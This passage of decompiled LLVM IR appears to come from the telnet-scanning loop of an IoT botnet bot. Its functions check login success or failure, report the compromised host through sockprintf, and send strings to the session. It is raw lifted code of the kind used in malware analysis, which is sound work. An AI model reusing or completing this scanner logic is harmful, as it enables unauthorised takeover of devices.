  %v2_804dd18 = add i32 %v1_804dd18, 8
  %v3_804dd18 = inttoptr i32 %v2_804dd18 to i32*
  store i32 %v0_804dd18, i32* %v3_804dd18, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804dd1f = load i32, i32* @esp, align 4
  %v2_804dd1f = add i32 %v1_804dd1f, 4
  %v3_804dd1f = inttoptr i32 %v2_804dd1f to i32*
  store i32 %arg1, i32* %v3_804dd1f, align 4
  %v0_804dd23 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dd23 = load i32, i32* @esp, align 4
  %v2_804dd23 = inttoptr i32 %v1_804dd23 to i32*
  store i32 %v0_804dd23, i32* %v2_804dd23, align 4
  %v1_804dd26 = call i32 @read_until_response(i32 %v6_804d170)
  store i32 %v1_804dd26, i32* %eax.global-to-local, align 4
  %v1_804dd2b = icmp eq i32 %v1_804dd26, 0
  br i1 %v1_804dd2b, label %dec_label_pc_804df12, label %dec_label_pc_804dd33

dec_label_pc_804dd33:                             ; preds = %dec_label_pc_804dcd2
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804dd36 = load i32, i32* @esp, align 4
  %v1_804dd36 = inttoptr i32 %v0_804dd36 to i32*
  store i32 0, i32* %v1_804dd36, align 4
  %v1_804dd3d = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804dd3d = call i32 @__GI_time(i32* %v1_804dd3d)
  store i32 %v2_804dd3d, i32* @esi, align 4
  %v0_804dd47 = load i32, i32* @ebx, align 4
  %v2_804dd57 = mul i32 %v0_804dd47, 28
  %v1_804dd5b = add i32 %v2_804dd59, %v2_804dd57
  %v2_804dd5e = inttoptr i32 %v1_804dd5b to i32*
  store i32 %v2_804dd3d, i32* %v2_804dd5e, align 4
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v2_804dd7b = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804dd7b, i32* %eax.global-to-local, align 4
  %v1_804dd7d = load i32, i32* @esp, align 4
  %v2_804dd7d = inttoptr i32 %v1_804dd7d to i32*
  store i32 %v2_804dd7b, i32* %v2_804dd7d, align 4
  %v1_804dd80 = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804dd80, i32* %eax.global-to-local, align 4
  %v1_804dd85 = icmp eq i32 %v1_804dd80, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dd85, label %dec_label_pc_804ddb7, label %dec_label_pc_804dd89

dec_label_pc_804dd89:                             ; preds = %dec_label_pc_804dd33
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804dda2 = load i32, i32* @esp, align 4
  %v1_804dda2 = add i32 %v0_804dda2, 4
  %v2_804dda2 = inttoptr i32 %v1_804dda2 to i32*
  store i32 0, i32* %v2_804dda2, align 4
  %v0_804ddaa = load i32, i32* %eax.global-to-local, align 4
  %v1_804ddaa = load i32, i32* @esp, align 4
  %v2_804ddaa = inttoptr i32 %v1_804ddaa to i32*
  store i32 %v0_804ddaa, i32* %v2_804ddaa, align 4
  %v3_804ddad = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804ddad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804ddb7:                             ; preds = %dec_label_pc_804dd33
  store i32 %v1_804dcea, i32* %eax.global-to-local, align 4
  %v2_804ddd2 = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804ddd2, i32* %eax.global-to-local, align 4
  %v1_804ddd4 = load i32, i32* @esp, align 4
  %v2_804ddd4 = inttoptr i32 %v1_804ddd4 to i32*
  store i32 %v2_804ddd2, i32* %v2_804ddd4, align 4
  %v1_804ddd7 = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804ddd7, i32* %eax.global-to-local, align 4
  %v1_804dddc = icmp eq i32 %v1_804ddd7, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804dddc, label %dec_label_pc_804deec, label %dec_label_pc_804dde4

dec_label_pc_804dde4:                             ; preds = %dec_label_pc_804ddb7
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804ddfa = add i32 %v2_804d1b0, %v2_804d120
  %v4_804ddfa = inttoptr i32 %v3_804ddfa to i8*
  %v5_804ddfa = load i8, i8* %v4_804ddfa, align 1
  %v6_804ddfa = zext i8 %v5_804ddfa to i32
  store i32 %v6_804ddfa, i32* %eax.global-to-local, align 4
  %v10_804ddff = icmp eq i8 %v5_804ddfa, 2
  %v1_804de01 = icmp eq i1 %v10_804ddff, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804de01, label %dec_label_pc_804de31, label %dec_label_pc_804de03

dec_label_pc_804de03:                             ; preds = %dec_label_pc_804dde4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804de1c = load i32, i32* @esp, align 4
  %v1_804de1c = add i32 %v0_804de1c, 4
  %v2_804de1c = inttoptr i32 %v1_804de1c to i32*
  store i32 7, i32* %v2_804de1c, align 4
  %v0_804de24 = load i32, i32* %eax.global-to-local, align 4
  %v1_804de24 = load i32, i32* @esp, align 4
  %v2_804de24 = inttoptr i32 %v1_804de24 to i32*
  store i32 %v0_804de24, i32* %v2_804de24, align 4
  %v3_804de27 = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804de27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804de31:                             ; preds = %dec_label_pc_804dde4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804de47 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804de47 = inttoptr i32 %v3_804de47 to i8*
  %v5_804de47 = load i8, i8* %v4_804de47, align 1
  %v6_804de47 = zext i8 %v5_804de47 to i32
  store i32 %v6_804de47, i32* %eax.global-to-local, align 4
  %v1_804de4f = mul nuw nsw i32 %v6_804de47, 4
  %v2_804de4f = add nuw nsw i32 %v1_804de4f, 134594992
  %v3_804de4f = inttoptr i32 %v2_804de4f to i32*
  %v4_804de4f = load i32, i32* %v3_804de4f, align 4
  store i32 %v4_804de4f, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804de6c = add i32 %v2_804d2e8, %v2_804d120
  %v4_804de6c = inttoptr i32 %v3_804de6c to i8*
  %v5_804de6c = load i8, i8* %v4_804de6c, align 2
  %v6_804de6c = zext i8 %v5_804de6c to i32
  store i32 %v6_804de6c, i32* %eax.global-to-local, align 4
  %v1_804de74 = mul nuw nsw i32 %v6_804de6c, 4
  %v2_804de74 = add nuw nsw i32 %v1_804de74, 134594980
  %v3_804de74 = inttoptr i32 %v2_804de74 to i32*
  %v4_804de74 = load i32, i32* %v3_804de74, align 4
  store i32 %v4_804de74, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804de94 = load i32, i32* @esp, align 4
  %v2_804de94 = inttoptr i32 %v1_804de94 to i32*
  store i32 %v2_804d122, i32* %v2_804de94, align 4
  %v0_804de97 = call i32 @get_telstate_host()
  store i32 %v0_804de97, i32* %eax.global-to-local, align 4
  %v0_804de9c = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804de9c, i32* %edx.global-to-local, align 4
  %v0_804dea2 = load i32, i32* @ebx, align 4
  %v1_804dea2 = load i32, i32* @esp, align 4
  %v2_804dea2 = add i32 %v1_804dea2, 16
  %v3_804dea2 = inttoptr i32 %v2_804dea2 to i32*
  store i32 %v0_804dea2, i32* %v3_804dea2, align 4
  %v0_804dea6 = load i32, i32* @esi, align 4
  %v1_804dea6 = load i32, i32* @esp, align 4
  %v2_804dea6 = add i32 %v1_804dea6, 12
  %v3_804dea6 = inttoptr i32 %v2_804dea6 to i32*
  store i32 %v0_804dea6, i32* %v3_804dea6, align 4
  %v1_804deaa = load i32, i32* @esp, align 4
  %v2_804deaa = add i32 %v1_804deaa, 8
  %v3_804deaa = inttoptr i32 %v2_804deaa to i32*
  store i32 %v0_804de97, i32* %v3_804deaa, align 4
  %v0_804deae = load i32, i32* @esp, align 4
  %v1_804deae = add i32 %v0_804deae, 4
  %v2_804deae = inttoptr i32 %v1_804deae to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8059372.258 to i32), i32* %v2_804deae, align 4
  %v0_804deb6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804deb6 = load i32, i32* @esp, align 4
  %v2_804deb6 = inttoptr i32 %v1_804deb6 to i32*
  store i32 %v0_804deb6, i32* %v2_804deb6, align 4
  %v2_804deb9 = call i32 @sockprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247)
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804ded7 = load i32, i32* @esp, align 4
  %v1_804ded7 = add i32 %v0_804ded7, 4
  %v2_804ded7 = inttoptr i32 %v1_804ded7 to i32*
  store i32 7, i32* %v2_804ded7, align 4
  %v0_804dedf = load i32, i32* %eax.global-to-local, align 4
  %v1_804dedf = load i32, i32* @esp, align 4
  %v2_804dedf = inttoptr i32 %v1_804dedf to i32*
  store i32 %v0_804dedf, i32* %v2_804dedf, align 4
  %v3_804dee2 = call i32 @advance_state(i32* %v1_804dd3d, i32 %stack_var_-624.247)
  store i32 %v3_804dee2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804deec:                             ; preds = %dec_label_pc_804ddb7
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804df05 = load i32, i32* @esp, align 4
  %v2_804df05 = inttoptr i32 %v1_804df05 to i32*
  store i32 %v2_804d122, i32* %v2_804df05, align 4
  %v1_804df08 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804df08, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804df12:                             ; preds = %dec_label_pc_804dcd2
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804df2d = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804df2d, i32* %eax.global-to-local, align 4
  %v1_804df2f = add i32 %v2_804df2d, 7
  store i32 %v1_804df2f, i32* @ebx, align 4
  %v0_804df32 = load i32, i32* @esp, align 4
  %v1_804df32 = inttoptr i32 %v0_804df32 to i32*
  store i32 0, i32* %v1_804df32, align 4
  %v1_804df39 = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804df39 = call i32 @__GI_time(i32* %v1_804df39)
  store i32 %v2_804df39, i32* %eax.global-to-local, align 4
  %v0_804df3e = load i32, i32* @ebx, align 4
  %v7_804df3e = icmp ult i32 %v0_804df3e, %v2_804df39
  %v1_804df40 = icmp eq i1 %v7_804df3e, false
  br i1 %v1_804df40, label %dec_label_pc_804e0dc, label %dec_label_pc_804df46

dec_label_pc_804df46:                             ; preds = %dec_label_pc_804df12
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804df5f = load i32, i32* @esp, align 4
  %v2_804df5f = inttoptr i32 %v1_804df5f to i32*
  store i32 %v2_804d122, i32* %v2_804df5f, align 4
  %v1_804df62 = call i32 @reset_telstate(i32 %stack_var_-628.248)
  store i32 %v1_804df62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804df6c:                             ; preds = %dec_label_pc_804d15a
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804df6f = load i32, i32* @esp, align 4
  %v1_804df6f = inttoptr i32 %v0_804df6f to i32*
  store i32 0, i32* %v1_804df6f, align 4
  %v1_804df76 = inttoptr i32 %v6_804d170 to i32*
  %v2_804df76 = call i32 @__GI_time(i32* %v1_804df76)
  %v0_804df80 = load i32, i32* @ebx, align 4
  %v2_804df90 = mul i32 %v0_804df80, 28
  %v1_804df94 = add i32 %v2_804dd59, %v2_804df90
  %v2_804df97 = inttoptr i32 %v1_804df94 to i32*
  store i32 %v2_804df76, i32* %v2_804df97, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804dfaf = inttoptr i32 %v2_804d122 to i32*
  %v4_804dfaf = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804dfaf, i32* %eax.global-to-local, align 4
  %v0_804dfb2 = load i32, i32* @esp, align 4
  %v1_804dfb2 = add i32 %v0_804dfb2, 12
  %v2_804dfb2 = inttoptr i32 %v1_804dfb2 to i32*
  store i32 16384, i32* %v2_804dfb2, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = add i32 %v0_804dfba, 8
  %v2_804dfba = inttoptr i32 %v1_804dfba to i32*
  store i32 4, i32* %v2_804dfba, align 4
  %v0_804dfc2 = load i32, i32* @esp, align 4
  %v1_804dfc2 = add i32 %v0_804dfc2, 4
  %v2_804dfc2 = inttoptr i32 %v1_804dfc2 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8059389.259 to i32), i32* %v2_804dfc2, align 4
  %v0_804dfca = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfca = load i32, i32* @esp, align 4
  %v2_804dfca = inttoptr i32 %v1_804dfca to i32*
  store i32 %v0_804dfca, i32* %v2_804dfca, align 4
  %v4_804dfcd = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804dfe8 = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804dfe8, i32* %eax.global-to-local, align 4
  %v0_804dfeb = load i32, i32* @esp, align 4
  %v1_804dfeb = add i32 %v0_804dfeb, 12
  %v2_804dfeb = inttoptr i32 %v1_804dfeb to i32*
  store i32 16384, i32* %v2_804dfeb, align 4
  %v0_804dff3 = load i32, i32* @esp, align 4
  %v1_804dff3 = add i32 %v0_804dff3, 8
  %v2_804dff3 = inttoptr i32 %v1_804dff3 to i32*
  store i32 7, i32* %v2_804dff3, align 4
  %v0_804dffb = load i32, i32* @esp, align 4
  %v1_804dffb = add i32 %v0_804dffb, 4
  %v2_804dffb = inttoptr i32 %v1_804dffb to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805938e.260 to i32), i32* %v2_804dffb, align 4
  %v0_804e003 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e003 = load i32, i32* @esp, align 4
  %v2_804e003 = inttoptr i32 %v1_804e003 to i32*
  store i32 %v0_804e003, i32* %v2_804e003, align 4
  %v4_804e006 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b, i32 %v6_804d170)
  %v0_804e00b = load i32, i32* bitcast ([7 x i8*]* @global_var_805c1a0.265 to i32*), align 32
  %v5_804e015 = inttoptr i32 %v0_804e00b to i8*
  %v1_804e01b = and i32 %v0_804e00b, -256
  store i32 %v1_804e01b, i32* %eax.global-to-local, align 4
  store i32 %v0_804e00b, i32* @edi, align 4
  %v3_804e024 = call i32 @_strlen(i8* %v5_804e015)
  store i32 %v3_804e024, i32* @ebx, align 4
  %v0_804e02d = load i32, i32* bitcast ([7 x i8*]* @global_var_805c1a0.265 to i32*), align 32
  store i32 %v0_804e02d, i32* @esi, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804e049 = load i32, i32* %v3_804dfaf, align 4
  store i32 %v4_804e049, i32* %eax.global-to-local, align 4
  %v0_804e04c = load i32, i32* @esp, align 4
  %v1_804e04c = add i32 %v0_804e04c, 12
  %v2_804e04c = inttoptr i32 %v1_804e04c to i32*
  store i32 16384, i32* %v2_804e04c, align 4
  %v0_804e054 = load i32, i32* @ebx, align 4
  %v1_804e054 = load i32, i32* @esp, align 4
  %v2_804e054 = add i32 %v1_804e054, 8
  %v3_804e054 = inttoptr i32 %v2_804e054 to i32*
  store i32 %v0_804e054, i32* %v3_804e054, align 4
  %v0_804e058 = load i32, i32* @esi, align 4
  %v1_804e058 = load i32, i32* @esp, align 4
  %v2_804e058 = add i32 %v1_804e058, 4
  %v3_804e058 = inttoptr i32 %v2_804e058 to i32*
  store i32 %v0_804e058, i32* %v3_804e058, align 4
  %v0_804e05c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e05c = load i32, i32* @esp, align 4
  %v2_804e05c = inttoptr i32 %v1_804e05c to i32*
  store i32 %v0_804e05c, i32* %v2_804e05c, align 4
  %v5_804e05f = call i32 @__libc_send(i32 %v0_804e00b, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804d02b)
  store i32 %v5_804e05f, i32* %eax.global-to-local, align 4
  %v2_804e064 = icmp slt i32 %v5_804e05f, 0
  %v1_804e066 = icmp eq i1 %v2_804e064, false
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804e066, label %dec_label_pc_804e08b, label %dec_label_pc_804e068

dec_label_pc_804e068:                             ; preds = %dec_label_pc_804df6c
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804e081 = load i32, i32* @esp, align 4
  %v2_804e081 = inttoptr i32 %v1_804e081 to i32*
  store i32 %v2_804d122, i32* %v2_804e081, align 4
  %v2_804e084 = call i32 @reset_telstate(i32 %v0_804e00b)
  store i32 %v2_804e084, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804e08b:                             ; preds = %dec_label_pc_804df6c
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v2_804e0a6 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804e0a6, i32* %eax.global-to-local, align 4
  %v1_804e0a8 = add i32 %v2_804e0a6, 25
  store i32 %v1_804e0a8, i32* @ebx, align 4
  %v0_804e0ab = load i32, i32* @esp, align 4
  %v1_804e0ab = inttoptr i32 %v0_804e0ab to i32*
  store i32 0, i32* %v1_804e0ab, align 4
  %tmp38 = inttoptr i32 %v0_804e00b to i32*
  %v3_804e0b2 = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804e0b2, i32* %eax.global-to-local, align 4
  %v0_804e0b7 = load i32, i32* @ebx, align 4
  %v7_804e0b7 = icmp ult i32 %v0_804e0b7, %v3_804e0b2
  %v1_804e0b9 = icmp eq i1 %v7_804e0b7, false
  br i1 %v1_804e0b9, label %dec_label_pc_804e0dc, label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e08b
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804e0d4 = load i32, i32* @esp, align 4
  %v2_804e0d4 = inttoptr i32 %v1_804e0d4 to i32*
  store i32 %v2_804d122, i32* %v2_804e0d4, align 4
  %v2_804e0d7 = call i32 @reset_telstate(i32 %v0_804e00b)
  store i32 %v2_804e0d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804e0dc:                             ; preds = %dec_label_pc_804d15a, %dec_label_pc_804e08b, %dec_label_pc_804df12, %dec_label_pc_804db25, %dec_label_pc_804d892, %dec_label_pc_804d752, %dec_label_pc_804d395, %dec_label_pc_804e068, %dec_label_pc_804df46, %dec_label_pc_804deec, %dec_label_pc_804de31, %dec_label_pc_804de03, %dec_label_pc_804dd89, %dec_label_pc_804dca4, %dec_label_pc_804dc7e, %dec_label_pc_804dc1b, %dec_label_pc_804db59, %dec_label_pc_804daf7, %dec_label_pc_804dac9, %dec_label_pc_804da11, %dec_label_pc_804d9eb, %dec_label_pc_804d988, %dec_label_pc_804d8c6, %dec_label_pc_804d864, %dec_label_pc_804d836, %dec_label_pc_804d786, %dec_label_pc_804d72c, %dec_label_pc_804d692, %dec_label_pc_804d66c, %dec_label_pc_804d518, %dec_label_pc_804d4f2, %dec_label_pc_804d375, %dec_label_pc_804d336, %dec_label_pc_804e0bb
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804d15a ], [ %stack_var_-624.247, %dec_label_pc_804e08b ], [ %stack_var_-624.247, %dec_label_pc_804e0bb ], [ %stack_var_-624.247, %dec_label_pc_804e068 ], [ %stack_var_-624.247, %dec_label_pc_804df12 ], [ %stack_var_-624.247, %dec_label_pc_804df46 ], [ %stack_var_-624.247, %dec_label_pc_804deec ], [ %stack_var_-624.247, %dec_label_pc_804de31 ], [ %stack_var_-624.247, %dec_label_pc_804de03 ], [ %stack_var_-624.247, %dec_label_pc_804dd89 ], [ %stack_var_-624.247, %dec_label_pc_804dca4 ], [ %stack_var_-624.247, %dec_label_pc_804dc7e ], [ %stack_var_-624.247, %dec_label_pc_804dc1b ], [ %stack_var_-624.247, %dec_label_pc_804db25 ], [ %stack_var_-624.247, %dec_label_pc_804db59 ], [ %stack_var_-624.247, %dec_label_pc_804daf7 ], [ %stack_var_-624.247, %dec_label_pc_804dac9 ], [ %v4_804d90a, %dec_label_pc_804da11 ], [ %v4_804d90a, %dec_label_pc_804d9eb ], [ %v4_804d90a, %dec_label_pc_804d988 ], [ %stack_var_-624.247, %dec_label_pc_804d892 ], [ %stack_var_-624.247, %dec_label_pc_804d8c6 ], [ %stack_var_-624.247, %dec_label_pc_804d864 ], [ %stack_var_-624.247, %dec_label_pc_804d836 ], [ %stack_var_-624.247, %dec_label_pc_804d752 ], [ %stack_var_-624.247, %dec_label_pc_804d786 ], [ %stack_var_-624.247, %dec_label_pc_804d72c ], [ %stack_var_-624.247, %dec_label_pc_804d692 ], [ %stack_var_-624.247, %dec_label_pc_804d66c ], [ %stack_var_-624.247, %dec_label_pc_804d395 ], [ %stack_var_-624.247, %dec_label_pc_804d518 ], [ %stack_var_-624.247, %dec_label_pc_804d4f2 ], [ %stack_var_-624.247, %dec_label_pc_804d375 ], [ %stack_var_-624.247, %dec_label_pc_804d336 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804d15a ], [ %stack_var_-628.248, %dec_label_pc_804e08b ], [ %stack_var_-628.248, %dec_label_pc_804e0bb ], [ %stack_var_-628.248, %dec_label_pc_804e068 ], [ %stack_var_-628.248, %dec_label_pc_804df12 ], [ %stack_var_-628.248, %dec_label_pc_804df46 ], [ %stack_var_-628.248, %dec_label_pc_804deec ], [ %stack_var_-628.248, %dec_label_pc_804de31 ], [ %stack_var_-628.248, %dec_label_pc_804de03 ], [ %stack_var_-628.248, %dec_label_pc_804dd89 ], [ %v4_804db9d, %dec_label_pc_804dca4 ], [ %v4_804db9d, %dec_label_pc_804dc7e ], [ %v4_804db9d, %dec_label_pc_804dc1b ], [ %stack_var_-628.248, %dec_label_pc_804db25 ], [ %stack_var_-628.248, %dec_label_pc_804db59 ], [ %stack_var_-628.248, %dec_label_pc_804daf7 ], [ %stack_var_-628.248, %dec_label_pc_804dac9 ], [ %stack_var_-628.248, %dec_label_pc_804da11 ], [ %stack_var_-628.248, %dec_label_pc_804d9eb ], [ %stack_var_-628.248, %dec_label_pc_804d988 ], [ %stack_var_-628.248, %dec_label_pc_804d892 ], [ %stack_var_-628.248, %dec_label_pc_804d8c6 ], [ %stack_var_-628.248, %dec_label_pc_804d864 ], [ %stack_var_-628.248, %dec_label_pc_804d836 ], [ %stack_var_-628.248, %dec_label_pc_804d752 ], [ %stack_var_-628.248, %dec_label_pc_804d786 ], [ %stack_var_-628.248, %dec_label_pc_804d72c ], [ %stack_var_-628.248, %dec_label_pc_804d692 ], [ %stack_var_-628.248, %dec_label_pc_804d66c ], [ %stack_var_-628.248, %dec_label_pc_804d395 ], [ %stack_var_-628.248, %dec_label_pc_804d518 ], [ %stack_var_-628.248, %dec_label_pc_804d4f2 ], [ %stack_var_-628.248, %dec_label_pc_804d375 ], [ %stack_var_-628.248, %dec_label_pc_804d336 ]
  %v4_804e0dc = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804e0dc, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804e0dc, %arg2
  br i1 %exitcond, label %dec_label_pc_804d100, label %dec_label_pc_804d10c

; uselistorder directives
  uselistorder i32 %v4_804e0dc, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804dd3d, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dcbd, { 1, 0 }
  uselistorder i32 %v4_804db9d, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804db10, { 1, 0 }
  uselistorder i32 %v0_804da2a, { 1, 0 }
  uselistorder i32 %v4_804d90a, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d87d, { 1, 0 }
  uselistorder i32 %v5_804d5f7, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804d596, { 1, 0 }
  uselistorder i32 %v2_804d57a, { 1, 0 }
  uselistorder i32 %v2_804d3e5, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804d1d8, { 1, 0 }
  uselistorder i32 %v6_804d170, { 8, 9, 10, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i32* %v1_804d127, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804d124, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804d122, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804d120, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 8, 44, 9 }
  uselistorder i32 %v1_804d112, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.247, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804d0ef, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804d048, { 1, 0 }
  uselistorder i32 %v2_804d02b, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 3, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 7, 0, 9, 8, 4, 5, 10, 2, 1, 6, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 45, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
